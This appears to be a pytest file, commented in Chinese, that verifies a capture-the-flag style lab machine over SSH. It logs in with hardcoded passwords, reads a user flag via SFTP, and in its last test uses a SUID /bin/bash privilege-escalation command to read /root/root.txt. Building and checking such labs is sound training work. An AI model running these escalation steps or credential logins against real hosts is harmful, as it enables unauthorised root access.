# 使用說明：
# 1. 將此腳本保存為 test.py。
# 2. 安裝 Python，作法為：在您的操作系統上安裝合適版本的 Python。
# 3. 安裝 pytest 和 paramiko，作法為：在命令行中執行 pip install pytest paramiko。
# 4. 在終端機中執行 pytest -v test.py 進行測試，以獲得詳細信息。

import pytest
import paramiko

# 指定參數
target_ip = "127.0.0.1"  # 請替換成目標主機IP
target_port = 2222  # SSH端口

@pytest.fixture(scope="module")
def ssh_client():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client

# 測試個案1: 檢查 SSH 服務是否可用
def test_ssh_service_running(ssh_client):
    """測試個案-SSH 服務是否正在運行"""
    try:
        ssh_client.connect(target_ip, username='boxadmin', password='GJ1FWcRKG86XbNb4Njhk', port=target_port)
    finally:
        ssh_client.close()

# 測試個案2: 檢查 Charlie 能否讀取存放的 user.txt 文件
def test_charlie_can_read_user_flag(ssh_client):
    """測試個案-外部提權：檢查 Charlie 能否讀取存放的 user.txt 文件"""
    try:
        ssh_client.connect(target_ip, username='charlie', password='aPjWy5wKMmHKrpRr1qm4', port=target_port)
        sftp = ssh_client.open_sftp()
        with sftp.file('/home/charlie/user.txt', 'r') as user_file:
            content = user_file.read().decode().strip()
            assert content == "user's flag", f"應該能夠讀取 /home/charlie/user.txt，實際內容為：{content}"
    finally:
        ssh_client.close()

# 測試個案3: 利用 SUID 漏洞提權讀取 /root/root.txt
def test_suid_privilege_escalation(ssh_client):
    """測試個案-內部提權：利用 SUID 漏洞提權讀取 /root/root.txt"""
    try:
        ssh_client.connect(target_ip, username='charlie', password='aPjWy5wKMmHKrpRr1qm4', port=target_port)
        # 使用 SUID /bin/bash 提權
        stdin, stdout, stderr = ssh_client.exec_command('echo "cat /root/root.txt" | /bin/bash')
        root_flag = stdout.read().decode().strip()
        assert root_flag == "root's flag", f"應該能夠讀取 /root/root.txt，實際內容為：{root_flag}"
    finally:
        ssh_client.close()
